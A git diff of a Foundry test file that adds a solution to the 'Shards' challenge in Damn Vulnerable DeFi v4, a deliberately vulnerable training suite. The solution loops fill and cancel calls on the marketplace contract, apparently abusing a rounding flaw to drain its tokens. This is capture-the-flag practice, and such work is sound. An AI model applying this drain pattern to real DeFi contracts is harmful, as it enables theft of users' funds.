@@ -2,6 +2,7 @@
 // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
 pragma solidity =0.8.25;
 
+import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
 import {Test, console} from "forge-std/Test.sol";
 import {
     ShardsNFTMarketplace,
@@ -13,6 +14,8 @@ import {
 import {DamnValuableStaking} from "../../src/DamnValuableStaking.sol";
 
 contract ShardsChallenge is Test {
+    using FixedPointMathLib for uint256;
+
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address seller = makeAddr("seller");
@@ -85,6 +88,8 @@ contract ShardsChallenge is Test {
 
         initialTokensInMarketplace = token.balanceOf(address(marketplace));
 
+        console.log("initialTokensInMarketplace", initialTokensInMarketplace);
+
         vm.stopPrank();
     }
 
@@ -114,7 +119,21 @@ contract ShardsChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_shards() public checkSolvedByPlayer {
-        
+        // uint256 price = uint256(NFT_OFFER_PRICE).mulDivDown(MARKETPLACE_INITIAL_RATE, 1e6);
+        // uint256 tokenNeeded = want.mulDivDown(price, NFT_OFFER_SHARDS);
+        // console.log("Tokens needed:", tokenNeeded);
+
+        for (uint256 i = 0; i < 1000; i++) {
+            uint256 want = 129;
+            token.approve(address(marketplace), type(uint256).max);
+
+            uint256 purchasedIndex = marketplace.fill(1, want);
+
+            marketplace.cancel(1, purchasedIndex);
+        }
+
+        console.log("token balance of player", token.balanceOf(player));
+
     }
 
     /**
